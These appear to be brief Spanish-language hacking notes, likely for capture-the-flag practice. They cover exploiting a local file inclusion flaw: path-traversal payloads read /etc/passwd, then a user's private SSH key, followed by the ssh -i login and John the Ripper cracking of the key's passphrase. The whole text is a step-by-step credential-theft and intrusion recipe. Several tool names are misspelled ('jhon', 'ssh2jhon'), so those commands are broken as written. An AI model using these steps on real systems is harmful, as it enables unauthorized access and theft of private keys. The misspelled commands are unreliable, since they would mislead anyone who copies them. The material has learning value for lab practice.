.k9jCuando en una url se llama a un parametro, es facil que encontremos un LFI
../../../../../../../../../../
intentaremos sacar el passwd (donde se encuentran los usuarios registrados del sistema)
la ruta de passwd /etc/passwd

por tanto pondremos

../../../../../../../../../../etc/passwd en la url como parámetro para ver si podemos acceder a passwd



si encontramos algo en el passwd que contenga /home/{x} ya tenemos un nombre de usuario

una vez que vemos algun usuario podemos buscar el id_rsa
la ruta será 

../../../../../../../../../../home/{usuario}/.ssh/id_rsa


CTRL + u para verlo bien

creamos un fichero con el nombre que queramos y lo pegamos
luego le damos permiso  600 al fichero
chmod 600 ficheroconId_rsa


luego hacemos ssh usando el id_rsa

ssh -i {fichero conRSA y permisos 600} {nombreDeUsuario}@IP



En ocasiones hay que crackear el id_rsa porque para poder conectar por ssh nos pide el salvaconducto
para eso usamos jhontheripper

ssh2jhon {fichero conRSA y permiosos 600} > hash

jhon --wordlist=/usr/share/wordlists/rockyou.txt hash



